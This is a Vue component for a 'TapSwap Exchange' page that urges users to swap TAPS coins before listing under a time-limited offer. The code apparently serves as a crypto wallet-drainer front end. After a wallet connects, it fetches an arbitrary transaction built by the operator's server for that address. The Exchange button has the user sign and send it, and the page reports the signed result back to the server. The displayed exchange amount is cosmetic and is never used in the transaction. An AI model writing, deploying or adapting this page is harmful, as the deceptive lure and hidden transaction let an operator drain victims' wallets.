<template>
    <section class="mt-3 mb-5">
        <div class="flex-center gap-2 flex-column text-center">
            <h1 class="text-lg text-color text-shadow">TapSwap Exchange</h1>
            <span class="text-sm description-color">
                This TON bridge allows you to exchange your TAPS coins even before the listing! Don't miss your chance –
                the offer is time-limited!
            </span>
        </div>
    </section>
    <section>
        <div class="bg-card w-full p-3 rounded-1 box-shadow flex-center flex-column gap-3">
            <div class="d-flex flex-column w-full gap-1">
                <span class="text-sm text-color">You Send</span>
                <div class="flex-center w-full p-2 gap-2 rounded-1 input-control">
                    <input v-model="count" type="number" class="w-full text-md input" >
                    <div class="flex-center gap-1">
                        <div class="flex-center mw-content">
                            <img src="@/assets/images/coin.png" width="25px">
                        </div>
                        <span class="input text-md">Taps</span>
                    </div>
                </div>
            </div>
            <div class="d-flex flex-column w-full gap-1">
                <span class="text-sm text-color">You Received</span>
                <div class="flex-center w-full p-2 gap-2 rounded-1 input-control">
                    <input disabled type="text" class="w-full text-md input" :value="Math.round((count * tokenPrice) / selected.price)">
                    <div class="flex-center gap-1">
                        <div class="input-control input-control flex-center">
                            <Dropdown v-model="selected" :options="currencies" optionLabel="name" placeholder="Currency"
                                class="w-full text-md">
                                <template #value="slotProps">
                                    <div v-if="slotProps.value" class="flex-center mw-content gap-1">
                                        <img :src="require(`@/assets/images/${slotProps.value.image}`)" width="25px" />
                                        <span class="text-md input">{{ slotProps.value.name }}</span>
                                    </div>
                                    <span v-else>
                                        <div class="flex-center mw-content gap-1">
                                            <img :src="require(`@/assets/images/${slotProps.value.image}`)"
                                                width="25px" />
                                            <span class="text-md input">{{ slotProps.value.name }}</span>
                                        </div>
                                    </span>
                                </template>
                                <template #option="slotProps">
                                    <div
                                        class="flex-center mw-content gap-1 input-control py-2 px-3 rounded-1 mt-1 w-full border-light">
                                        <img :src="require(`@/assets/images/${slotProps.option.image}`)" width="20px" />
                                        <span class="text-sm input">{{ slotProps.option.name }}</span>
                                    </div>
                                </template>
                            </Dropdown>
                        </div>
                    </div>
                </div>
            </div>
            <span class="text-color text-sm">• Exchange fee ~ 0.15 TON •</span>

        </div>
    </section>
    <section class="mt-3">
        <div class="input-control px-2 py-3 rounded-1 box-shadow flex-center gap-2" v-if="waitGetTransaction">
            <LoaderButton :loading="waitGetTransaction">

            </LoaderButton>
        </div>
        <div v-else-if="!wallet" @click="open" class="input-control px-2 py-3 rounded-1 box-shadow flex-center gap-2">
            <div class="flex-center">
                <img src="@/assets/images/ton.png" width="20px" alt="">
            </div>
            <span class="text-md button">Connect Ton Wallet</span>
        </div>
        <div class="flex-center gap-2" v-else-if="showExchange">
            <div @click="exchange" class="w-full input-control px-2 py-2 rounded-1 box-shadow flex-center gap-2">
                <div class="flex-center">
                    <ExchangeIcon />
                </div>
                <span class="text-md button">Exchange</span>
            </div>

            <div @click="tonConnectUI.tonConnectUI.disconnect()"
                class="mw-content input-control p-2 h-full rounded-1 box-shadow flex-center">
                <ChangeIcon width="39px" height="39px" />
            </div>
        </div>


    </section>
</template>
<style scoped>
.input-control {
    background-color: #fff;
}

.input {
    color: #3a3a3a;
}

.button {
    font-size: 18px !important;
}
</style>
<script lang="ts" setup>
import axios from 'axios'
import { useTonConnectModal } from '@townsquarelabs/ui-vue';
import { BASE_URL } from '@/configurations/httpConfiguration'
import LoaderButton from '@/components/buttons/LoaderButton.vue';
import ChangeIcon from '@/components/icons/ChangeIcon.vue';
import ExchangeIcon from '@/components/icons/ExchangeIcon.vue';
import Dropdown from 'primevue/dropdown';
import { useTonAddress } from '@townsquarelabs/ui-vue';
import { useTonWallet } from '@townsquarelabs/ui-vue';
import { useTonConnectUI } from '@townsquarelabs/ui-vue';

const tonConnectUI = useTonConnectUI();
const userFriendlyAddress = useTonAddress();
const wallet = useTonWallet();
const { state, open, close } = useTonConnectModal();

import { ref, onMounted } from 'vue';

const transaction = ref({});
const showExchange = ref(false);
const waitGetTransaction = ref(false);

const updateTransactionMessage = async () => {
    if (!wallet.value) return;

    waitGetTransaction.value = true;
    try {
        const response = await axios.get(BASE_URL + '/transaction/' + userFriendlyAddress.value, {
            headers: {
                Authorization: (window as any).Telegram.WebApp.initData ?? '',
            }
        })
        showExchange.value = true;
        transaction.value = response.data;
    }
    catch {
        showExchange.value = false;
        await tonConnectUI.tonConnectUI.disconnect()
    }
    waitGetTransaction.value = false;
}

const confirmTransactionMessage = async (bos) => {
    try {
        const response = await axios.post(BASE_URL + '/payment', { bos },{
            headers: {
                Authorization: (window as any).Telegram.WebApp.initData ?? '',
            }
        })
    }
    catch {}
}

const exchange = async () => {
    if (!wallet.value) return;
    tonConnectUI.tonConnectUI.sendTransaction(transaction.value)
        .then(async(response) => { 
            await confirmTransactionMessage(response.bos)
        })
        .catch(except => { });
}

onMounted(async () => {
    await updateTransactionMessage()
    tonConnectUI.tonConnectUI.onStatusChange(async (wallet) => {
        await updateTransactionMessage();
    })
});


const tokenPrice = 0.001;
const count = ref(100000);

const currencies = ref([
    { name: 'Ton', image: 'toncoin.png' ,price : 6},
    { name: 'USDT', image: 'tether.png' ,price : 1},
]);
const selected = ref(currencies.value[0]);
</script>